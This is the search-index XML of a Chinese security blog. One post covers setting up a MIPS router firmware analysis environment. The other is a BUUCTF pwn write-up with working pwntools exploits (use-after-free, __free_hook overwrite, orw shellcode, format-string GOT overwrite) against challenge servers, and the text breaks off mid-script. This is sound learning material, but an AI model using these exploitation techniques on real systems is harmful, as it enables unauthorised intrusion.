<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>路由器环境搭建</title>
      <link href="/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/"/>
      <url>/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/</url>
      
        <content type="html"><![CDATA[<p>​        <a id="more"></a></p><p>​        学vmpwn学到自闭，逆指令太难了。。。整点新东西缓解一下。大一就想学iot安全，环境一来二去也搭了有几次，不过要越过glibc的pwn直接跳到iot的pwn还是不太好，一是ctf比赛中glibc的pwn还是战必很大的，二是打基础，最后找工作人也得看ctf经历不是？最终在大二上中旬开始学pwn，后来又弃了一段时间，转学web(<del>我想日站</del>！)最终在寒假又重新捡起了pwn，后来打了几场比赛，NPUCTF,安恒月赛，常规的glibc的pwn我还是能应付应付的，满怀期望的迎接De1CTF，去年是作为web狗参赛，今年是作为一只pwn🐕参赛，结果。。。。打自闭了，签到pwn是c艹，剩下的没一道常规题，两道mips，一道安卓，和去年的pwn的难度差太多了。。。。De1CTF之后又是网鼎杯，18年的网鼎杯pwn也比较常规，赛前我觉得如果是上一届那种难度我还是能做的，结果再次自闭。。。第一次接触vmpwn竟然是在网鼎杯，直接懵逼，一道编译器pwn，一道vmpwn，一道盲pwn。。。两场比赛之后我深刻的认识到了我是个fw，太辣鸡了，知识面太窄，基础不够扎实，仅仅只会glibc下的堆栈pwn完全不够了，要走的路还很长很长。。。。</p><p>​       扯得有点远了，说了一下学pwn的一些历程，接下来进入正题，路由器环境搭建。</p><p>​        参考了挺多大师傅的博客，以前都是直接无脑复制粘贴(<del>现在也是，只不过更谨慎地复制粘贴</del>)。</p><p>首先是安装<strong>binwalk</strong>，有两种方法</p><pre><code>方法1:sudo apt-get install binwalk 方法2:git clone https://github.com/devttys0/binwalk.gitcd binwalksudo ./deps.shsudo python ./setup.py installsudo apt-get install python-lzmasudo -H pip install git+https://github.com/ahupp/python-magicsudo -H pip install git+https://github.com/sviehb/jefferson</code></pre><p>直接sudo apt-get有些包会安装不完全，所以推荐源码安装</p><p>然后安装 <strong>firmadyne</strong>，需要安装<strong>postgres</strong>数据库</p><pre><code>sudo apt-get install postgresgit clone https://github.com/firmadyne/firmadynecd firmadyne/ &amp;&amp; sudo download.shsudo -u postgres createuser -P firmadyne  sudo -u postgres createdb -O firmadyne firmwaresudo -u postgres psql -d firmware &lt; ./firmadyne/database/schema</code></pre><p>接下来是qemu，按照H4lo大佬的说法，过高版本或者过低版本在某些情况下会报错，推荐<strong>qemu2.4.0</strong>版本，下载压缩包本地编译</p><pre><code>wget https://download.qemu.org/qemu-2.4.0.tar.xztar xvf qemu-2.4.0.tar.xz &amp;&amp; cd qemu-2.4.0/./configuremake -j8sudo make install</code></pre><p><strong>sasquatch</strong>安装</p><pre><code>sudo apt-get install zlib1g-dev liblzma-dev liblzo2-devsudo git clone https://github.com/devttys0/sasquatchcd sasquatch &amp;&amp; sudo make &amp;&amp; sudo make install</code></pre><p><strong>交叉编译环境 buildroot安装</strong></p><p>还是跟着h牛的文章来，先把所有库都装上</p><pre><code>sudo apt-get install libncurs*wget http://buildroot.uclibc.org/downloads/snapshots/buildroot-snapshot.tar.bz2tar -jxvf buildroot-snapshot.tar.bz2cd buildroot/make cleanmake menuconfigsudo make</code></pre><p>h牛wget的网址有问题，应该是<strong>snapshot</strong>，他多加了一个s，我当时就是下不好这个压缩包，后来直接搜索了一波，才发现问题所在</p><p><strong>make menuconfig</strong>之后，会出现一个GUI界面，进入<strong>Target option</strong>，选择<strong>Target Architecture Varient</strong>为<strong>Mips 32</strong>，将<strong>Target Architecture</strong>选为<strong>MIPS(little endian)</strong>,保存后退出到上一级，进入<strong>Toolchain</strong>，将<strong>Kernel Headers</strong>修改为本机的kernel版本即可，然后保存退出，编译时间会有一个小时左右</p><p> <strong>gdb-multiarch</strong></p><pre><code>sudo apt-get install gdb-multiarch</code></pre><p>接下来我们还需要安装一下mips版本的gcc及其相关组件，apt 中对应的包名为 <code>gcc-mips-linux-gnu</code> 与 <code>gcc-mipsel-linux-gnu</code></p><pre><code>sudo apt-get install gcc-mips-linux-gnusudo apt-get install gcc-mipsel-linux-gnu</code></pre><p>其中mips-linux-gnu-gcc用来编译大端序程序，mipsel-linux-gnu-gcc用来编译小端序</p><p>我们来写一个小程序验证一下</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> <span class="token operator">*</span>a<span class="token punctuation">;</span>        a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这是h牛的文章中的一个程序</p><p>首先我们用小端序编译</p><pre><code>mipsel-linux-gnu-gcc demo.c -o demo -static</code></pre><p>静态编译</p><p><img src="/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/1.jpg" alt=""></p><p>可以看出确实是小端序静态链接，接着我们运行一下</p><p><img src="/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/2.jpg" alt=""></p><p>运行没问题。我们再用大端序编译一下</p><pre><code>mips-linux-gnu-gcc demo.c -o demo -static</code></pre><p><img src="/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/3.jpg" alt=""></p><p>确实是大端序静态链接</p><p>接着运行</p><p><img src="/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/4.jpg" alt=""></p><p>无误</p><p>现在都是静态链接，我们再动态编译一下</p><pre><code>mipsel-linux-gnu-gcc demo.c -o demo</code></pre><p><img src="/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/5.jpg" alt=""></p><pre><code>qemu-mipsel -L /usr/mipsel-linux-gnu/ ./demo</code></pre><p><img src="/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/6.jpg" alt=""></p><p>-L是连接指定的libc库</p><p>至此，环境就算配置完毕，还有一些gdb动态调试mips文件的，后面会再更新</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF刷题记录</title>
      <link href="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/"/>
      <url>/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/</url>
      
        <content type="html"><![CDATA[<h2 id="0x1-gyctf-2020-signin"><a href="#0x1-gyctf-2020-signin" class="headerlink" title="0x1.gyctf_2020_signin"></a>0x1.gyctf_2020_signin</h2><p>环境是2.27.这题的考点在于，<strong>calloc</strong>不会从tcache中取chunk，而是直接从fastbin中取，并且会将fastbin中剩余的chunk链入tcache</p><a id="more"></a><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/1.jpg" alt=""></p><p>程序的漏洞在于dele函数中，有uaf漏洞,同时还存在一个后门函数，先使用<strong>calloc</strong>分配一个chunk，如果<strong>ptr</strong>不为0，就可getshell</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/2.jpg" alt=""></p><p>exp如下:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleepcontext<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary<span class="token operator">=</span><span class="token string">'./gyctf_2020_signin'</span><span class="token comment" spellcheck="true">#io = process('./gyctf_2020_signin')</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25777</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'gyctf_2020_signin'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your choice?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'idx?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your choice?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'idx?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#sleep(0.1)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your choice?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'idx?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your choice?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'6'</span><span class="token punctuation">)</span>ptr<span class="token operator">=</span><span class="token number">0x4040c0</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>ptr<span class="token number">-0x10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io,'b calloc')</span>getshell<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>即先将tcache填满，之后free一个chunk进入fastbin，接着从tcache申请一块，然后调用后门函数，触发calloc，将ptr处写入前一个tcache的地址即可getshell</p><h2 id="0x2-gyctf-2020-document"><a href="#0x2-gyctf-2020-document" class="headerlink" title="0x2.gyctf_2020_document"></a>0x2.gyctf_2020_document</h2><p>程序保护全开</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/4.jpg" alt=""></p><p>增删查改四个功能，<strong>add</strong>功能有点冗长，主要就是分配两个chunk，一个大小为<strong>0x20</strong>，一个<strong>0x90</strong>，前者的内容为后者的指针和一个标志位，记录该chunk是否被修改过(只允许修改一次)，<strong>0x90</strong>大小的chunk的数据段的前0x10大小记录<strong>name</strong>和<strong>sex</strong>，后0x70记录<strong>information</strong></p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/5.jpg" alt=""></p><p>漏洞点位于<strong>dele</strong>函数，<strong>uaf</strong>漏洞</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/6.jpg" alt=""></p><p>并且<strong>edit</strong>和<strong>show</strong>功能通过0x20大小chunk中存在的指针来进行相应操作，这也可以利用.由于我们可以分配的chunk大小固定为0x20和0x90，所以无法攻击<strong>malloc_hook</strong>,这里采用改<strong>free_hook</strong>为<strong>system</strong>的攻击方式，exp如下:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./gyctf_2020_document'</span><span class="token comment" spellcheck="true"># io = process('./gyctf_2020_document')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">28239</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'gyctf_2020_document'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> data<span class="token punctuation">,</span> sex<span class="token operator">=</span><span class="token string">'F'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input name'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input sex'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>sex<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'information'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> data<span class="token punctuation">,</span> change<span class="token operator">=</span><span class="token string">'Y'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'sex?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>change<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'information'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x70</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c4b78</span>__free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'__free_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__free_hook<span class="token number">-0x10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'\x31'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(io)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>利用<strong>uaf</strong>漏洞，造成堆块重叠，使我们可以控制0x20大小的chunk中的指针，将指针改为<strong>free_hook</strong>的地址即可，然后利用edit修改为<strong>system</strong></p><h2 id="0x3-极客大挑战-2019-Not-Bad"><a href="#0x3-极客大挑战-2019-Not-Bad" class="headerlink" title="0x3.[极客大挑战 2019]Not Bad"></a>0x3.[极客大挑战 2019]Not Bad</h2><p>这题没有任何保护，存在沙箱，无法getshell，所以考虑使用<strong>orw</strong>攻击读取flag</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/8.jpg" alt=""></p><p>程序在<strong>0x123000</strong>处开辟了一块内存</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/9.jpg" alt=""></p><p>考虑首先在栈中利用shellcode往<strong>0x123000</strong>处写入orw的shellcode，然后调用0x123000处的shellcode即可，exp如下:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleepcontext<span class="token punctuation">.</span>binary<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./bad'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#io = process('./bad')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">28529</span><span class="token punctuation">)</span>jmp_rsp <span class="token operator">=</span> <span class="token number">0x400a01</span>orw_payload <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">)</span>orw_payload <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x123100</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span>orw_payload <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x123100</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x123000</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> \    asm<span class="token punctuation">(</span><span class="token string">'mov rax,0x123000;call rax'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>jmp_rsp<span class="token punctuation">)</span>payload <span class="token operator">+=</span> asm<span class="token punctuation">(</span><span class="token string">'sub rsp,0x30;jmp rsp'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'have fun!'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>orw_payload<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x4-axb-2019-fmt64"><a href="#0x4-axb-2019-fmt64" class="headerlink" title="0x4.axb_2019_fmt64"></a>0x4.axb_2019_fmt64</h2><p>程序无限循环，got表可写</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/10.jpg" alt=""></p><p>首先泄露libc地址，然后将<strong>printf</strong>的<strong>got</strong>表值修改为<strong>system</strong>的地址，输入<strong>/bin/sh</strong>即可getshell.exp如下：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#io = process('./axb_2019_fmt64')</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26696</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./axb_2019_fmt64'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'lock'</span> <span class="token operator">+</span> <span class="token string">'%9$s'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'puts_addr => {}'</span><span 